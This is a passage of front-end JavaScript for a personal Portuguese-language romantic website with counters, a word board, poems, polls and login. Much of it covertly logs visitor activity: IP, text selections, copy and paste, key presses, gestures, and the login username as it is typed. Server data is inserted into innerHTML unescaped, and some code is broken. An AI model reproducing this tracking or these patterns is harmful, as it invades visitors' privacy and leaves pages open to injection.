document.addEventListener("DOMContentLoaded", () => {
  const menu = document.getElementById("menu");
  const menuleft = document.getElementById("menuleft");
  const Newboard = document.getElementById("Newboard");
  const counters = document.getElementById("counters");

  const avisosBackBtn = document.getElementById("avisos-back");
  const pollsBackBtn = document.getElementById("polls-back");
  const btnAbrirQuadro = document.getElementById("btnAbrirQuadro");
  const backBoardBtn = document.getElementById("back-board-btn");
  const openTodayBtn = document.getElementById("open-today");
  const backFromTodayBtn = document.getElementById("back-from-today");
  const avisosModal = document.getElementById("avisos-modal");
  const pollsModal = document.getElementById("polls-modal");
  const todayModal = document.getElementById("today-modal");
  const poemModal = document.getElementById("poem-modal");
  const sobreModal = document.getElementById("sobre-modal");
  const menuSobre = document.getElementById("menuSobre");
  const menuSugestao = document.getElementById("menuSugestao");

  const wordBoard = document.getElementById("word-board");
  const newWordInput = document.getElementById("new-word");
  const addWordBtn = document.getElementById("add-word");
  const imageInput = document.getElementById("new-image");

  document.getElementById("login-btn").addEventListener("click", login);
  document.getElementById("register-btn").addEventListener("click", register);

  let sendingAlertVisitas = false;
  let sendingAlertInteracoes = false;

  fetch("/api/get-ip")
    .then((res) => res.json())
    .then((data) => {
      window.userip = data.ip;
      Logger.enqueue(`🌐 IP do usuário identificado: ${window.userip}`);
    })
    .catch((err) => Logger.enqueue(`⚠️ Falha ao obter IP: ${err.message}`));

  function mostrarModal(modal) {
    if (!modal) return;
    modal.style.display = "flex";
  }

  function abrirModalDinamico(titulo, conteudo, botoes = []) {
    modalTitle.textContent = titulo;
    modalBody.textContent = conteudo;
    modalActions.innerHTML = "";
    botoes.forEach((b) => {
      const button = document.createElement("button");
      button.textContent = b.text;
      button.onclick = b.onClick;
      modalActions.appendChild(button);
    });
    modal.style.display = "flex";
    overlay.classList.add("active");
  }

  function fecharTodosModais() {
    const openModals = document.querySelectorAll(
      '.modal.show, .modal[style*="display: flex"]'
    );
    openModals.forEach((modal) => {
      modal.style.display = "none";
      modal.classList.remove("show");
    });

    overlay.classList.remove("active");

    if (
      document.querySelectorAll('.modal.show, .modal[style*="display: flex"]')
        .length === 0
    ) {
      menu.style.display = "flex";
      menuleft.style.display = "flex";
    }
  }

  let userip = "";

  async function fetchUserIP() {
    try {
      const res = await fetch("/api/get-ip");
      const data = await res.json();
      userip = data.ip || "";
    } catch (err) {
      console.error("Erro ao obter IP do usuário:", err);
    }
  }

  fetchUserIP();

  function showSection(section) {
    const sections = [menu, menuleft, Newboard, counters];
    sections.forEach((s) => (s.style.display = "none"));
    section.style.display = "flex";
  }

  function showNotification(message, type = "info", duration = 3000) {
    const notif = document.getElementById("notification");
    notif.textContent = message;

    switch (type) {
      case "success":
        notif.style.backgroundColor = "#4CAF50";
        Logger.enqueue("✅ Notificação de sucesso exibida");
        break;
      case "error":
        notif.style.backgroundColor = "#f44336";
        Logger.enqueue("❌ Notificação de erro exibida");
        break;
      case "warning":
        notif.style.backgroundColor = "#ff9800";
        Logger.enqueue("⚠️ Notificação de aviso exibida");
        break;
      default:
        notif.style.backgroundColor = "#1e1e2f";
        Logger.enqueue("ℹ️ Notificação informativa exibida");
    }

    notif.classList.add("show");

    setTimeout(() => {
      notif.classList.remove("show");
    }, duration);
  }

  btnAbrirQuadro.addEventListener("click", () => showSection(Newboard));
  backBoardBtn.addEventListener("click", () => showSection(menu));

  function backToMenu() {
    counters.style.display = "none";
    menu.style.display = "flex";
    menuleft.style.display = "flex";

    if (intervalId) {
      clearInterval(intervalId);
      intervalId = null;
    }
  }

  const counterElems = [
    document.getElementById("counter1"),
    document.getElementById("counter2"),
    document.getElementById("counter3"),
  ];

  const countersData = [
    {
      name: "EU CONHECI A MULHER QUE VIRIA SER O AMOR DA MINHA VIDA",
      date: new Date("2024-11-27T22:30:00"),
      image: "1.png",
    },
    {
      name: "EU ADMITI QUE AMAVA ELA",
      date: new Date("2025-03-10T07:00:00"),
      image: "1.png",
    },
    {
      name: "ATÉ, MEU AMOR...",
      date: new Date("2025-08-11T17:15:00"),
      image: "2.png",
    },
  ];

  function formatDate(date) {
    const options = { day: "2-digit", month: "long", year: "numeric" };
    return date.toLocaleDateString("pt-BR", options);
  }

  dayjs.extend(dayjs_plugin_duration);
  dayjs.extend(dayjs_plugin_relativeTime);

  function updateCounter(el, data) {
    const now = dayjs();
    const diff = dayjs.duration(now.diff(dayjs(data.date)));

    el.innerHTML = `
    <div class="counter-header">
      <img src="${data.image}" />
      <div class="counter-text">
        <div class="name">${data.name}</div>
        <div class="time">
          ${diff.years()} anos, ${diff.months()} meses, ${diff.days()} dias,
          ${diff.hours()}h ${diff.minutes()}m 
        </div>
      </div>
    </div>
  `;
  }

  function updateCounters() {
    counterElems.forEach((el, i) => updateCounter(el, countersData[i]));
  }

  let intervalId = null;

  function startCounters() {
    if (intervalId) clearInterval(intervalId);
    intervalId = setInterval(updateCounters, 1000);
  }

  function stopCounters() {
    if (intervalId) {
      clearInterval(intervalId);
      intervalId = null;
    }
  }

  function loadImage(src) {
    return new Promise((resolve, reject) => {
      const img = new Image();
      img.src = src;
      img.onload = () => resolve(img);
      img.onerror = reject;
    });
  }

  async function showCounters() {
    menu.style.display = "none";
    menuleft.style.display = "none";
    counters.style.display = "block";
    Logger.enqueue("⏳ Usuário abriu a seção de Contadores");
    const loadingEl = document.getElementById("counter-loading");
    loadingEl.style.display = "block";

    counterElems.forEach((el) => (el.style.display = "none"));

    try {
      const imagePromises = countersData.map((data) => loadImage(data.image));

      const loadedImages = await Promise.all(imagePromises);

      counterElems.forEach((el, i) => {
        el.style.display = "block";
        updateCounter(el, countersData[i]);
      });
    } catch (err) {
      console.error("Erro ao carregar imagens dos contadores:", err);
    } finally {
      loadingEl.style.display = "none";
      startCounters();
    }
  }

  const poemBtn = document.getElementById("poem-btn");
  const poemText = document.getElementById("poem-text");

  poemBtn.addEventListener("click", async () => {
    mostrarModal(poemModal);

    Logger.enqueue("📜 Usuário abriu o Poema do Dia");

    const poemTextEl = document.getElementById("poem-text");
    poemTextEl.textContent = "⌛ Carregando poema...";

    try {
      const res = await fetch("/api/poem");
      const data = await res.json();
      poemTextEl.textContent = data.poem || "💖 Nenhum poema disponível 💖";
    } catch (err) {
      poemTextEl.textContent = "❌ Erro ao carregar poema 😢";
      Logger.enqueue("❌ Erro ao carregar o Poema do Dia");
    }
  });

  const closePoemBtn = document.getElementById("close-modal");

  if (closePoemBtn) {
    closePoemBtn.addEventListener("click", () => {
      if (!poemModal) return;
      poemModal.style.display = "none";
      poemModal.classList.remove("show");
      overlay.classList.remove("active");
      Logger.enqueue("📜 Usuário fechou o Poema do Dia");
    });
  }

  avisosBackBtn?.addEventListener("click", () => {
    fecharTodosModais();
    Logger.enqueue("🔔 Usuário fechou o painel de Avisos");
  });

  pollsBackBtn?.addEventListener("click", fecharTodosModais);
  btnAbrirQuadro?.addEventListener("click", () => showSection(Newboard));
  backBoardBtn?.addEventListener("click", () => showSection(menu));

  function closeModalClickOutside(modal) {
    window.addEventListener("click", (e) => {
      if (e.target === modal) fecharTodosModais();
    });
  }

  closeModalClickOutside(poemModal);
  closeModalClickOutside(sobreModal);
  closeModalClickOutside(todayModal);

  const btn = document.getElementById("square-menu");
  const sidebar = document.getElementById("sidebar");
  const overlay = document.getElementById("overlay");
  const modal = document.getElementById("custom-modal");
  const modalTitle = document.getElementById("custom-title");
  const modalBody = document.getElementById("custom-body");
  const modalActions = document.getElementById("custom-actions");
  const modalClose = document.getElementById("custom-close");

  btn.addEventListener("click", () => {
    const isOpen = btn.getAttribute("data-open") === "true";
    btn.setAttribute("data-open", (!isOpen).toString());
    btn.setAttribute("aria-expanded", (!isOpen).toString());
    sidebar.classList.toggle("open");
    Logger.enqueue("📂 Usuário abriu/fechou a aba lateral");
  });

  overlay.addEventListener("click", () => {
    const modals = document.querySelectorAll(
      '.modal.show, .modal[style*="display: flex"]'
    );
    modals.forEach((modal) => (modal.style.display = "none"));
    modals.forEach((modal) => modal.classList.remove("show"));
    overlay.classList.remove("active");
  });

  modalClose.addEventListener("click", fecharModal);

  function abrirModal(titulo, conteudo, botoes = []) {
    modalTitle.textContent = titulo;
    modalBody.textContent = conteudo;
    modalActions.innerHTML = "";
    botoes.forEach((b) => {
      const button = document.createElement("button");
      button.textContent = b.text;
      button.onclick = b.onClick;
      modalActions.appendChild(button);
    });
    modal.style.display = "flex";
    overlay.classList.add("active");
  }
  function fecharModal() {
    modal.style.display = "none";

    overlay.classList.remove("active");

    sidebar.classList.remove("open");
    btn.setAttribute("data-open", "false");
    btn.setAttribute("aria-expanded", "false");

    menu.style.display = "flex";
    menuleft.style.display = "flex";
  }

  const sobreClose = document.getElementById("sobre-close");

  menuSobre.addEventListener("click", () => {
    mostrarModal(sobreModal);
    Logger.enqueue("ℹ️ Usuário abriu o modal 'Sobre este site'");
  });

  sobreClose.addEventListener("click", () => {
    if (!sobreModal) return;
    sobreModal.style.display = "none";
    sobreModal.classList.remove("show");
    overlay.classList.remove("active");
    menu.style.display = "flex";
    menuleft.style.display = "flex";

    Logger.enqueue("ℹ️ Usuário fechou o modal 'Sobre este site'");
  });

function addWordToBoard(item) {
  const card = document.createElement("div");
  card.className = "word-card";

  const imgUrl = item.imagem || item.image;
  if (imgUrl) {
    const img = document.createElement("img");

    img.src = imgUrl.startsWith("http")
      ? imgUrl
      : `https://quadro-ac3o.vercel.app/images/${imgUrl}`;

    img.alt = item.palavra || "Imagem";
    img.className = "word-card-img";
    card.appendChild(img);
  }

  if (item.palavra) {
    const text = document.createElement("p");
    text.textContent = item.palavra;
    text.className = "word-card-text";
    card.appendChild(text);
  }

  wordBoard.appendChild(card);
}

  async function loadWords() {
    const res = await fetch("/api/quadro-palavras");
    const data = await res.json();
    data.sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
    wordBoard.innerHTML = "";
    data.forEach(addWordToBoard);
    wordBoard.style.display = "flex";
  }

  loadWords();
  window.addWordToBoard = addWordToBoard;

  const confirmModal = document.getElementById("confirmModal");
  const menuDelete = document.getElementById("menuDelete");
  const modalContent = document.getElementById("modalContent");
  let sendingAlert = false;

  const suggestionModal = document.getElementById("suggestionModal");
  const closeSuggestionBtn = document.getElementById("closeSuggestion");

  menuSugestao.addEventListener("click", () => {
    if (!suggestionModal) return;
    suggestionModal.classList.add("show");
    Logger.enqueue("✏️ Usuário abriu o modal de Sugestões");
  });

  closeSuggestionBtn?.addEventListener("click", () => {
    if (!suggestionModal) return;
    suggestionModal.classList.remove("show");
    Logger.enqueue("✏️ Usuário fechou o modal de Sugestões");
  });

  document
    .getElementById("sendSuggestion")
    .addEventListener("click", async () => {
      const textEl = document.getElementById("suggestionText");
      const text = textEl.value.trim();
      if (!text)
        return showNotification(
          "⚠️ Digite uma sugestão antes de enviar!",
          "warning"
        );

      try {
        await fetch("/api/send-telegram-alert", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            message: `💡 Nova sugestão/reclamação:\n\n${text}`,
            type: "interacoes",
          }),
        });

        showNotification("✅ Sugestão enviada com sucesso!", "success");
        textEl.value = "";
        fecharTodosModais();
        Logger.enqueue("✅ Usuário enviou uma Sugestão com sucesso");
      } catch (err) {
        if (err.name === "AbortError") {
          console.log("Envio de sugestão abortado pelo fechamento do modal");
        } else {
          showNotification(
            `❌ Erro ao enviar sugestão: ${err.message}`,
            "error"
          );
        }
      } finally {
      }
    });

  document.getElementById("closeSuggestion").addEventListener("click", () => {
    fecharTodosModais();
    Logger.enqueue("✏️ Usuário fechou o modal de Sugestões antes de enviar");
  });

function getImageUrl(filename) {
  return `/images/${filename}`;
}


  imageInput.addEventListener("change", () => {
    const file = imageInput.files[0];
    if (!file) {
      return;
    }
    addImage(file);
    imageInput.value = "";
  });

  addWordBtn.addEventListener("click", async () => {
    const word = newWordInput.value.trim();
    if (!word) {
      showNotification("⚠️ Digite uma palavra antes de adicionar!", "warning");
      return;
    }

    try {
      const res = await fetch("/api/quadro-palavras", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ palavra: word }),
      });
      const result = await res.json();
      if (result.success) {
        showNotification(`✅ Palavra "${word}" adicionada!`, "success");
        loadWords();
        newWordInput.value = "";
        Logger.enqueue("✅ Usuário adicionou uma nova palavra ao Quadro");
      } else {
        showNotification(
          `❌ Erro ao adicionar: ${result.error || "desconhecido"}`,
          "error"
        );
        Logger.enqueue("❌ Erro ao carregar palavras do Quadro");
      }
    } catch (err) {
      console.error(err);
      showNotification("❌ Falha na conexão ao adicionar palavra.", "error");
      Logger.enqueue("❌ Falha na conexão ao adicionar palavra no Quadro");
    }
  });

  btnAbrirQuadro?.addEventListener("click", () => {
    [menu, menuleft, counters].forEach((el) => (el.style.display = "none"));
    Newboard.style.display = "block";
    Logger.enqueue("📝 Usuário abriu o Quadro de Palavras");
  });

  backBoardBtn?.addEventListener("click", () => {
    Newboard.style.display = "none";
    menu.style.display = "flex";
    menuleft.style.display = "flex";
    Logger.enqueue("📝 Usuário voltou do Quadro de Palavras para o Menu");
  });

  newWordInput?.addEventListener("keypress", (e) => {
    if (e.key === "Enter") addWordBtn.click();
  });

  async function addWord(word) {
    if (!word) return;

    const formData = new FormData();
    formData.append("palavra", word);

    try {
      const res = await fetch("/api/quadro-palavras", {
        method: "POST",
        body: formData,
      });
      const result = await res.json();
      if (result.success) {
        showNotification("✅ Palavra adicionada!", "success");
        loadWords();
        newWordInput.value = "";
        Logger.enqueue("✅ Palavra adicionada ao quadro", `Conteúdo: ${word}`);
      } else {
        showNotification(
          `❌ Erro ao adicionar palavra: ${result.error || "desconhecido"}`,
          "error"
        );
      }
    } catch (err) {
      showNotification(`❌ Erro de rede: ${err.message}`, "error");
    }
  }

  async function addImage(imageFile) {
    if (!imageFile) return;

    const formData = new FormData();
    formData.append("image", imageFile);

    try {
      const res = await fetch("/api/quadro-palavras", {
        method: "POST",
        body: formData,
      });
      const result = await res.json();
      if (result.success) {
        showNotification("✅ Imagem adicionada!", "success");
        loadWords();
        imageInput.value = "";
        Logger.enqueue("🖼️ Usuário adicionou uma imagem ao Quadro");
      } else {
        showNotification(
          `❌ Erro ao adicionar imagem: ${result.error || "desconhecido"}`,
          "error"
        );
        Logger.enqueue("❌ Erro ao adicionar imagem ao Quadro");
      }
    } catch (err) {
      showNotification(`❌ Erro de rede: ${err.message}`, "error");
    }
  }

  if (openTodayBtn && todayModal) {
    openTodayBtn.addEventListener("click", async () => {
      mostrarModal(todayModal);
      Logger.enqueue("🎨 Usuário abriu a seção Desenhos");

      const container = document.getElementById("today-drawing");
      if (container) container.textContent = "⌛ Carregando desenho...";

      try {
        const res = await fetch("/api/today-drawing");
        const data = await res.json();

        if (container) {
          if (data.success) {
            container.innerHTML =
              data.type === "image"
                ? `<img src="${data.url}" style="max-width:100%; border-radius:12px;">`
                : `<p style="font-style:italic;">${data.content}</p>`;
          } else {
            container.textContent = "❌ Não foi possível carregar os desenhos!";
            Logger.enqueue("❌ Erro ao carregar os desenhos");
            Logger.enqueue("❌ Erro ao carregar os desenhos");
          }
        }
      } catch (err) {
        if (container)
          container.textContent = "⚠️ Erro de conexão ao buscar oaa desenhos.";
        Logger.enqueue("❌ Erro de conexão ao buscar os desenhos");
      }
    });
  }

  backFromTodayBtn.addEventListener("click", () => {
    fecharTodosModais();
    Logger.enqueue("🎨 Usuário fechou a seção dos Desenho");
  });

  async function loadTodayDrawing() {
    const container = document.getElementById("today-drawing");
    if (container) container.textContent = "⌛ Carregando desenho...";

    try {
      const res = await fetch("/api/today-drawing");
      const data = await res.json();

      if (data.success) {
        if (data.type === "image") {
          container.innerHTML = `<img src="${data.url}" alt="Desenho do dia" style="max-width:100%; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.5);">`;
        } else if (data.type === "text") {
          container.innerHTML = `<p style="font-style:italic; color:#c0d6ff;">${data.content}</p>`;
        } else {
          container.textContent =
            "💖 Desenho recebido, mas formato desconhecido!";
        }
      } else {
        container.textContent = "❌ Não foi possível carregar os desenhos!";
      }
    } catch (err) {
      console.error("Erro ao carregar desenho:", err);
      container.textContent = "⚠️ Erro de conexão ao buscar o desenho.";
    }
  }

  const menuAvisos = document.getElementById("menuAvisos");
  const avisosList = document.getElementById("avisos-list");

  menuAvisos.addEventListener("click", async (e) => {
    e.preventDefault();
    mostrarModal(avisosModal);
    Logger.enqueue("🔔 Usuário abriu a aba de Avisos");

    const avisosList = document.getElementById("avisos-list");
    avisosList.innerHTML = "⌛ Carregando avisos...";

    try {
      const res = await fetch("/api/avisos");
      let avisos = await res.json();

      if (avisos.length) {
        avisos.sort(
          (a, b) =>
            new Date(a.criado_em || a.data) - new Date(b.criado_em || b.data)
        );

        avisosList.innerHTML = avisos
          .sort(
            (a, b) =>
              new Date(a.criado_em || a.data) - new Date(b.criado_em || b.data)
          )
          .map((a) => `<p>${a.mensagem}</p>`)
          .join("");
      } else {
        avisosList.innerHTML = "<p>✅ Nenhum aviso no momento</p>";
      }
    } catch (err) {
      avisosList.innerHTML = "<p>Erro ao carregar avisos 😢</p>";
      Logger.enqueue("❌ Erro ao carregar Avisos");
    }
  });

  const menuPolls = document.getElementById("menuPolls");
  const pollsList = document.getElementById("polls-list");

  async function votar(pollId, opcao) {
    try {
      const res = await fetch(`/api/polls/${pollId}/vote`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ opcao }),
      });

      const data = await res.json();
      if (data.success) {
        showNotification(`✅ Voto registrado: ${opcao}`, "success");
      } else {
        showNotification(
          `❌ Erro ao registrar voto: ${data.error || "desconhecido"}`,
          "error"
        );
      }
    } catch (err) {
      console.error("Erro ao votar:", err);
      alert("❌ Falha na conexão ao votar.");
    }
  }

  menuPolls.addEventListener("click", async (e) => {
    e.preventDefault();
    mostrarModal(pollsModal);
    Logger.enqueue("📊 Usuário abriu a aba de Votações");

    const pollsList = document.getElementById("polls-list");
    pollsList.innerHTML = "⌛ Carregando votações...";

    try {
      const res = await fetch("/api/polls");
      const polls = await res.json();
      if (!polls.length)
        return (pollsList.innerHTML = "<p>✅ Nenhuma votação no momento</p>");

      pollsList.innerHTML = "";
      polls.forEach((p) => {
        const div = document.createElement("div");
        div.className = "poll-item";
        div.innerHTML = `<h3>${p.pergunta}</h3>`;
        p.opcoes.forEach((op) => {
          const btn = document.createElement("button");
          btn.textContent = op;
          btn.addEventListener("click", async () => {
            try {
              const res = await fetch(`/api/polls/${p.id}/vote`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ opcao: op }),
              });
              const data = await res.json();
              if (data.success)
                showNotification(`✅ Voto registrado: ${op}`, "success");
              else
                showNotification(
                  `❌ Erro ao registrar voto: ${data.error}`,
                  "error"
                );
            } catch (err) {
              showNotification("❌ Falha na conexão ao votar.", "error");
            }
          });
          div.appendChild(btn);
        });
        pollsList.appendChild(div);
      });
    } catch (err) {
      pollsList.innerHTML = "<p>Erro ao carregar votações 😢</p>";
      Logger.enqueue("❌ Erro ao carregar Votações");
    }
  });

  document
    .getElementById("counter-btn")
    .addEventListener("click", showCounters);
  document.getElementById("back-btn").addEventListener("click", backToMenu);
  document.getElementById("calendar-btn").addEventListener("click", () => {
    Logger.enqueue("📅 Usuário abriu o Calendário");
    window.location.href = "calendar.html";
  });

  document.getElementById("note").addEventListener("click", () => {
    Logger.enqueue("📝 Usuário abriu o Diário");
    window.location.href = "diario.html";
  });

  const galleryContainer = document.getElementById("github-gallery");
  const featuredContainer = document.getElementById("featured-image");

  async function getFilesWithDate() {
    try {
      const res = await fetch("/api/github-images");
      const files = await res.json();

      if (!Array.isArray(files)) return [];

      const filesWithDate = await Promise.all(
        files.map(async (file) => {
          if (!/\.(png|jpg|jpeg|gif)$/i.test(file.name)) return null;

          const commits = await commitRes.json();
          const date =
            commits[0]?.commit?.committer?.date || new Date().toISOString();

          return {
            name: file.name,
            download_url: file.download_url,
            date: new Date(date),
          };
        })
      );

      return filesWithDate.filter(Boolean);
    } catch (err) {
      console.error("Erro ao buscar arquivos do GitHub:", err);
      return [];
    }
  }

  async function loadGithubImages() {
    galleryContainer.innerHTML = "<p>⌛ Carregando imagens...</p>";

    const files = await getFilesWithDate();
    if (!files.length) {
      galleryContainer.innerHTML = "<p>❌ Nenhuma imagem encontrada</p>";
      return;
    }
    files.sort((a, b) => a.date - b.date);

    let featuredIndex = 0;
    renderFeatured(files[featuredIndex]);
    renderGallery(
      files.filter((_, i) => i !== featuredIndex),
      files,
      featuredIndex
    );
  }

  function downloadImage(url, filename) {
    fetch(url)
      .then((res) => res.blob())
      .then((blob) => {
        const blobUrl = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = blobUrl;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        a.remove();
        URL.revokeObjectURL(blobUrl);
      })
      .catch((err) => console.error("Erro ao baixar imagem:", err));
  }

  function renderFeatured(file) {
    featuredContainer.innerHTML = `
    <div class="featured-wrapper">
      <button class="download-btn">
        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="white" viewBox="0 0 24 24">
          <path d="M12 16v-8M8 12l4 4 4-4M4 20h16" 
                stroke="white" stroke-width="2" 
                stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </button>
      <img src="https://desenhos-nine.vercel.app/images/${file.name}" alt="${file.name}">
    </div>
  `;

    const btn = featuredContainer.querySelector(".download-btn");
    btn.addEventListener("click", () => {
      downloadImage(
        `https://desenhos-nine.vercel.app/images/${file.name}`,
        file.name
      );
      Logger.enqueue(`⬇️ Usuário baixou imagem: ${file.name}`);
    });
  }

  function renderGallery(thumbnails, allImages, featuredIndex) {
    galleryContainer.innerHTML = "";
    thumbnails.forEach((imgFile, i) => {
      const card = document.createElement("div");
      card.className = "card";

      const imgEl = document.createElement("img");
      imgEl.src = `https://desenhos-nine.vercel.app/images/${imgFile.name}`;
      imgEl.alt = imgFile.name;

      card.addEventListener("click", () => {
        const newFeatured = imgFile;

        thumbnails[i] = allImages[featuredIndex];
        featuredIndex = allImages.indexOf(newFeatured);

        renderFeatured(newFeatured);
        renderGallery(thumbnails, allImages, featuredIndex);
        Logger.enqueue(`🖼️ Usuário trocou destaque para: ${imgFile.name}`);
      });

      card.appendChild(imgEl);
      galleryContainer.appendChild(card);
    });
  }

  const authDiv = document.getElementById("auth");
  const appDiv = document.getElementById("app");
  const usernameSpan = document.getElementById("username");

  document.getElementById("show-register").addEventListener("click", () => {
    Logger.enqueue("✏️ Usuário clicou em 'Ainda não tem conta? Registrar'");
    document.getElementById("login-box").classList.add("hidden");
    document.getElementById("register-box").classList.remove("hidden");
  });

  document.getElementById("show-login").addEventListener("click", () => {
    Logger.enqueue("🔐 Usuário clicou em 'Já tem conta? Login'");
    document.getElementById("register-box").classList.add("hidden");
    document.getElementById("login-box").classList.remove("hidden");
  });

  async function checkLogin() {
    try {
      const res = await fetch("/api/me");
      const data = await res.json();

      if (data.loggedIn) {
        authDiv.style.display = "none";
        appDiv.style.display = "flex";
        appDiv.style.flexDirection = "column";
        appDiv.style.justifyContent = "center";
        appDiv.style.alignItems = "center";

        usernameSpan.textContent = data.user.username;
      } else {
        authDiv.style.display = "flex";
        appDiv.style.display = "none";
        document.getElementById("login-box").classList.remove("hidden");
        document.getElementById("register-box").classList.add("hidden");
      }
    } catch (err) {
      console.error(err);
    }
  }

  async function login() {
    const username = document.getElementById("login-username").value;
    const password = document.getElementById("login-password").value;

    const res = await fetch("/api/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password }),
    });

    const data = await res.json();
    if (data.success) {
      authDiv.style.display = "none";
      appDiv.style.display = "block";
      usernameSpan.textContent = username;
    } else {
      alert(data.error || "Erro ao logar");
    }
  }

  async function register() {
    const username = document.getElementById("register-username").value;
    const password = document.getElementById("register-password").value;

    const res = await fetch("/api/register", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password }),
    });

    const data = await res.json();
    if (data.success) {
      authDiv.style.display = "none";
      appDiv.style.display = "block";
      usernameSpan.textContent = username;
    } else {
      alert(data.error || "Erro ao registrar");
    }
  }

  async function logout() {
    await fetch("/api/logout", { method: "POST" });
    authDiv.style.display = "flex";
    appDiv.style.display = "none";
  }

  const menuLogout = document.getElementById("logout-btn");
  menuLogout.addEventListener("click", logout);

  checkLogin();

  loadGithubImages();

  function trackTouchScroll(element, message, interval = 300) {
    if (!element) return;
    let lastSent = 0;
    let startY = 0;

    element.addEventListener("touchstart", (e) => {
      startY = e.touches[0].clientY;
    });

    element.addEventListener("touchmove", (e) => {
      const now = Date.now();
      if (now - lastSent < interval) return;

      const currentY = e.touches[0].clientY;
      const diff = currentY - startY;

      if (Math.abs(diff) > 5) {
        const direction = diff > 0 ? "⬆️ para cima" : "⬇️ para baixo";
        Logger.enqueue(`${message} (${direction})`);
        lastSent = now;
        startY = currentY;
      }
    });
  }

  trackTouchScroll(window, "🖱️ Usuário rolou a página");
  trackTouchScroll(
    document.getElementById("poem-body"),
    "📜 Usuário rolou o poema!"
  );
  trackTouchScroll(
    document.getElementById("sobre-body"),
    "ℹ️ Usuário rolou conteúdo do Sobre!"
  );
  trackTouchScroll(
    document.getElementById("suggestionText"),
    "✏️ Usuário rolou textarea de sugestão!"
  );
  trackTouchScroll(
    document.getElementById("word-board"),
    "📝 Usuário rolou quadro de palavras!"
  );

  window.addEventListener("orientationchange", () => {
    Logger.enqueue("📱 Mudança de orientação da tela");
  });

  let initialDistance = 0;

  document.addEventListener("touchstart", (e) => {
    if (e.touches.length === 2) {
      const dx = e.touches[0].clientX - e.touches[1].clientX;
      const dy = e.touches[0].clientY - e.touches[1].clientY;
      initialDistance = Math.sqrt(dx * dx + dy * dy);
    }
  });

  document.addEventListener("touchmove", (e) => {
    if (e.touches.length === 2) {
      const dx = e.touches[0].clientX - e.touches[1].clientX;
      const dy = e.touches[0].clientY - e.touches[1].clientY;
      const currentDistance = Math.sqrt(dx * dx + dy * dy);

      if (!initialDistance) return;

      if (currentDistance > initialDistance + 10) {
        Logger.enqueue("🤏 Multitouch detectado: Zoom IN (aumentar)");
      } else if (currentDistance < initialDistance - 10) {
        Logger.enqueue("🤏 Multitouch detectado: Zoom OUT (diminuir)");
      }

      initialDistance = currentDistance;
    }
  });

  let initialAngle = 0;

  document.addEventListener("touchstart", (e) => {
    if (e.touches.length === 2) {
      const dx = e.touches[1].clientX - e.touches[0].clientX;
      const dy = e.touches[1].clientY - e.touches[0].clientY;
      initialAngle = Math.atan2(dy, dx) * (180 / Math.PI);
    }
  });

  document.addEventListener("touchmove", (e) => {
    if (e.touches.length === 2) {
      const dx = e.touches[1].clientX - e.touches[0].clientX;
      const dy = e.touches[1].clientY - e.touches[0].clientY;
      const currentAngle = Math.atan2(dy, dx) * (180 / Math.PI);
      const rotation = currentAngle - initialAngle;

      if (Math.abs(rotation) > 15) {
        const direction =
          rotation > 0 ? "↩️ Rotação Horária" : "↪️ Rotação Anti-horária";
        Logger.enqueue(`🤏 Multitouch detectado: ${direction}`);
        initialAngle = currentAngle;
      }
    }
  });

  document.querySelectorAll('a[href^="http"]').forEach((link) => {
    link.addEventListener("click", () => {
      Logger.enqueue(`🌐 Usuário clicou em link externo: ${link.href}`);
    });
  });

  document.addEventListener("contextmenu", (e) => {
    Logger.enqueue(`🖱️ Clique com botão direito em: ${e.target.tagName}`);
  });

  document.addEventListener("copy", () =>
    Logger.enqueue("📋 Usuário copiou conteúdo")
  );
  document.addEventListener("paste", () =>
    Logger.enqueue("📋 Usuário colou conteúdo")
  );

  document.addEventListener("selectionchange", () => {
    const selection = window.getSelection().toString().trim();
    if (selection.length > 5)
      Logger.enqueue(
        `📝 Usuário selecionou texto: "${selection.slice(0, 50)}..."`
      );
  });

  document.addEventListener("keydown", (e) => {
    if (e.key === "Enter") Logger.enqueue("⌨️ Pressionou Enter");
    else if (e.key === "Escape") Logger.enqueue("⌨️ Pressionou Escape");
    else if (e.ctrlKey && e.key === "s")
      Logger.enqueue("💾 Pressionou Ctrl+S (provável tentativa de salvar)");
  });

  window.addEventListener("beforeunload", () =>
    Logger.enqueue("🚪 Usuário saiu ou recarregou a página")
  );
  document.addEventListener("visibilitychange", () => {
    if (document.hidden)
      Logger.enqueue("😴 Usuário minimizou ou trocou de aba");
    else Logger.enqueue("👀 Usuário voltou para a aba ativa");
  });

  window.addEventListener("resize", () => {
    Logger.enqueue(
      `📐 Redimensionou janela para ${window.innerWidth}x${window.innerHeight}`
    );
  });

  let touchStartX = 0;
  document.addEventListener(
    "touchstart",
    (e) => (touchStartX = e.touches[0].clientX)
  );
  document.addEventListener("touchend", (e) => {
    const diff = e.changedTouches[0].clientX - touchStartX;
    if (Math.abs(diff) > 100) {
      const dir = diff > 0 ? "➡️ direita" : "⬅️ esquerda";
      Logger.enqueue(`👆 Swipe detectado para ${dir}`);
    }
  });

  window.addEventListener("error", (e) => {
    Logger.enqueue(
      `💥 Erro JavaScript: ${e.message} em ${e.filename}:${e.lineno}`
    );
  });
  window.addEventListener("unhandledrejection", (e) => {
    Logger.enqueue(`💥 Erro de Promise não tratada: ${e.reason}`);
  });

  document.getElementById("login-btn").addEventListener("click", function () {
    Logger.enqueue("🔐 Movimento no login: Tentativa de login enviada");
    checkLogin();
  });

  document.getElementById("show-register").addEventListener("click", () => {
    Logger.enqueue("✏️ Usuário clicou em 'Ainda não tem conta? Registrar'");
  });

  document
    .getElementById("register-btn")
    .addEventListener("click", function () {
      Logger.enqueue("Usuário clicou em registrar");
    });
  const loginUsername = document.getElementById("login-username");
  const loginPassword = document.getElementById("login-password");
  const loginBtn = document.getElementById("login-btn");

  loginUsername.addEventListener("input", () => {
    Logger.enqueue(`🔐 Login: digitando username -> ${loginUsername.value}`);
